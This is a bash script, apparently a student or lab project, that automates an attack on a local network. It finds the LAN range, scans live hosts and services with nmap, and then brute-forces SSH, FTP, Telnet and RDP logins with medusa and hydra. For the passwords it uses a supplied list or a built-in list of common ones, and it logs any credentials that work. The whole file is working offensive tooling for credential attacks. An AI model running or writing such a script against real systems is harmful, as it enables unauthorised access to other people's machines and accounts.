#!/bin/bash 

start_time=$(date +"%Y-%m-%d %H:%M:%S")

echo "******* hello ********"
echo "*** by : izack garcia ***"

read -p " > what name would you like the output directory to have: " tod

rm -rf $tod
mkdir $tod
chmod +x $tod
od=($(pwd)/$tod)

#Automatically identify the LAN network range

function  ilnr ()
{
nr=$(ip address | awk '/inet .* eth/{print $2}')
echo -e " * network range is : $nr . \n "
echo " * scanning live hosts..."
echo " "
nmap -sn $nr | grep "report for" | awk '{print $5}' | tee -a $od/live_hosts.txt
echo "  " 
echo " * scanning for open services..."
nmap -sV $nr | awk '/Nmap scan report for/ {ip=$5} /[0-9]\/[a-zA-Z]+/ {print "IP:", ip, "Service:", $3}' | tee -a $od/open_services.txt
echo "   " 
cd $od


# Loop through each service in the array and grep the lines

allowed_services=("ssh" "ftp" "rdp" "telnet" )
for service in "${allowed_services[@]}"; do
    grep "Service: $service" open_services.txt >> temp_services.txt
done

awk '!seen[$1]++' temp_services.txt > temp_services.temp && mv temp_services.temp temp_services.txt


cat temp_services.txt > open_services.txt
rm temp_services.txt

cd ..

#Find potential vulnerabilities for each device
echo " * scanning for potential vulnerabilities for each device..."

#nmap -Pn -sV -p 1-4000 --script=vuln -oA "$od"/potential_vuln.nse $nr  > /dev/null 2>&1
}	

ilnr
#providing user list and password list
function lists ()
{
read -p " > please provide a user list path: " ulp
read -p " > Do you want to use an existing password list? (y/n): " epl

if [ "$epl" == "y" ]; then
	read -p " > would you like to provide your own password list? " apl
		if [ "$apl" == "yes" ]; then
		read -p " > Enter the path to the existing password list: " psf
		else 
		    psf="password_list.txt"
    cat <<EOF > "$psf"
password
administrator
admin
msfadmin
123456
12345678
1234
qwerty
12345
dragon
pussy
baseball
football
letmein
monkey
696969
abc123
mustang
michael
shadow
master
jennifer
111111
2000
jordan
superman
harley
1234567
fuckme
# Add more passwords as needed
EOF
		fi
    
    if [ ! -e "$psf" ]; then
        echo " - Error: The specified password list file does not exist."
        exit 1
    fi
else
    echo " > Enter passwords for a new list (one per line). Press Enter after each password. Type 'end' on a new line when done:"

    passwords=""usr
    while IFS= read -r line && [ "$line" != "end" ]; do
        passwords="$passwords$line"$'\n'
    done

    psf="password_list.txt"
    echo "$passwords" > "$psf"
	echo "New password list created: $psf"

fi
}
lists


#If a login service is available, Brute Force with the password list

function bf()
{
# preparing files to brute forcing
	
for port in 21 22 23 3389; do
    nmap -p $port -iL $od/live_hosts.txt -oG $od/ip${port}.txt > /dev/null
done

cat $od/ip22.txt | grep open -B 4 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u > $od/ipssh.txt
cat $od/ip21.txt | grep open -B 4 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u > $od/ipftp.txt
cat $od/ip23.txt | grep open -B 4 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"  | sort -u > $od/iptelnet.txt
cat $od/ip3389.txt | grep open -B 4 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u > $od/iprdp.txt

for fprot in ip22.txt ip21.txt ip23.txt ip3389.txt; do
rm $od/$fprot > /dev/null
done

 
#brute forcing with medusa
for i in $(cat $od/ipssh.txt)
	do
	echo " "
	echo " * Brute forcing $i with SSH... "
	echo " "
	medusa -U $ulp -P $psf -h "$i" -M ssh >> $od/bfssh.txt 2>&1
	done


for i in $(cat $od/ipftp.txt)
	do
	echo " * Brute forcing $i with FTP... "
	echo " "
	medusa -U $ulp -P $psf -h "$i" -M ftp >> $od/bfftp.txt  2>&1
	done

for i in $(cat $od/iptelnet.txt)
	do
	echo " * Brute forcing $i with TELNET... "
	echo " "
	medusa -U $ulp -P $psf -h "$i" -M telnet >>  $od/bftelnet.txt  2>&1
	done

for i in $(cat $od/iprdp.txt)
	do
	echo " * Brute forcing $i with RDP... " 
	echo " "
	hydra -L $ulp -P $psf -h "$i" rdp >> $od/bfrdp.txt 2>&1
	done

# saving results and display to the user
	
for file in $od/bfssh.txt $od/bfftp.txt $od/bftelnet.txt $od/bfrdp.txt:
do 
	 if [ -f "$file" ] && grep -qi success "$file"; then
    echo " * results for $(basename "$file" .txt) brute force: "
    grep -i success "$file" | tee -a "$od/bflog.txt"
else
    echo " - Brute force for $file failed."
fi

done
	
	
}	
bf	

function log()
{
	cat "$od/bflog.txt"
echo " "
echo " * More results can be found inside $od."

}
log

end_time=$(date +"%Y-%m-%d %H:%M:%S")


# Display general statistics

# checking scan duration
start_seconds=$(date -d "$start_time" +%s)
end_seconds=$(date -d "$end_time" +%s)
duration=$((end_seconds - start_seconds))

# checking live host count
live_hosts_file="$od/live_hosts.txt"
live_host_count=$(wc -l < "$live_hosts_file")


#displaying script duration 
echo " * Scan Duration:   $duration seconds" | tee -a $od/bflog.txt
echo " * Number of live hosts found: $live_host_count (stored in $od/live_hosts.txt)" | tee -a $od/bflog.txt

#Allow the user to search with an IP address
function search_scan()
{
while true; do
    # Prompt the user to enter an IP address
    
   echo " * Live hosts available: $(cat "$od/live_hosts.txt")"
	echo " "
    read -p " * Enter the IP address to search for (or 'exit' to quit the script): " user_ip
	echo " "
    # Check if the user wants to exit
    if [ "$user_ip" == "exit" ]; then
        echo " * Exiting the script. Goodbye!"
        break
    fi
	
    # Check if the entered IP address is valid
    if [[ ! $user_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo " - Invalid IP address. Please enter a valid IP address."
        continue
    fi

	grep -r "$user_ip" "$od"/*
	 read -p " > Press Enter to continue..."
done
}
search_scan

find $od -type f -empty -delete


exit





